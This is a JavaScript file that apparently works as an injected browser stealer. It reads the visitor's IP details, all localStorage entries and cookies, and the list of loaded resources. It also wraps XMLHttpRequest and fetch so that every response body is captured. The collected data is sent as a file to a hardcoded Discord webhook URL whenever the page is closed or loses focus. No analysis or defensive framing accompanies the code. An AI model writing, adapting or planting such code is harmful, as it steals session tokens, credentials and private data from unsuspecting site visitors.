var fileData = [];
window.webhook = function(what, extra) {
    let webhookUrl = "https://discord.com/api/webhooks/1335485941233614930/uxsvj421gk_UYIw5WLI40_v6RpOY37qWAXGxSaAOvGKdCTB4FvIOt4QpOz44jy8Ih4Od";

    if (what === 'init') {
        if (extra) {
            webhookUrl = extra;
            fileData = [];
        }
    }

    if (what === "add") {
        if (new Blob(fileData).size > 7 * 1024 * 1024) { // 7MB size check
            webhook("send", "Exceed");
            fileData = [];
        }
        fileData.push("\n"+extra+"\n");
    }

    if (what === "send") {
        const file = new File(fileData, extra, { type: "text/plain" });
        const formData = new FormData();
        formData.append("file", file);
        fetch(webhookUrl, { method: "POST", body: formData })
            .then(response => response.text())  // Handle response
			.then(data => console.log(data))
            .catch(error => console.error("Webhook send failed:", error));
        fileData = [];
    }

    if (what === "error"){
        webhook("add", `\n\n\n\n\n\nERRRRROOOORRRRR\n\n${extra}\n\n\n\n\n`)
        webhook("send", 'ERROR')
    }
    console.log(fileData)
};

fetch('https://ipinfo.io/json')
    .then(r => r.json())
    .then(a => webhook("add", `\n\n-------IP-------\n\n${JSON.stringify(a, null, 2)}\n\n\n`))

const data = {};
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data[key] = localStorage.getItem(key);
}
const cookies = document.cookie.split(';').map(cookie => {
    const [name, value] = cookie.trim().split('=');
    return { name, value };
});
webhook("add", `\n\n------LOCAL STORAGE-----\n${JSON.stringify(data, null, 2)}\n\n`);
webhook("add", `\n\n------COOKIES------\n${JSON.stringify(cookies, null, 2)}\n\n`);

window.addEventListener('unload', () => {
    webhook("send", "CLOSED")
});

let resourceList = {
    resource: [],
    init: []
}
const resources = performance.getEntriesByType("resource");
resources.forEach(resource => {
    resourceList.resource.push(resource.name)
    resourceList.init.push(resource.initiatorType)
});
let name = resourceList.resource.map((resource, index) => {
    return `${resource} : (${resourceList.init[index]})`;
}).join("\n")
webhook("add", `\n\n\n------RESOURCE NAME-----\n\n\n${name}\n\n\n`);

const originalXHROpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function (method, url) {
    console.log(`XHR Request - Method: ${method}, URL: ${url}`);
    this.addEventListener("load", function () {
        webhook("add", `\n\n--------XHR-----\n\n${url}\n${this.responseText}\n\n`)
    });
    return originalXHROpen.apply(this, arguments);
};

// Hook into fetch API
const originalFetch = window.fetch;
window.fetch = function (...args) {
    const [url, options] = args;
    console.log(`Fetch Request - URL: ${url}`, options || {});
    return originalFetch.apply(this, args)
        .then(response => {
            response.clone().text().then(text => {
                webhook("add", `\n\n------FETCH----\n\n${url}\n${text}\n\n`)
            });
            return response;
        })
        .catch(error => {
            webhook("error", error)
        });
};

window.addEventListener('blur', () => {
    webhook("send", "UNFOCUSED")
});
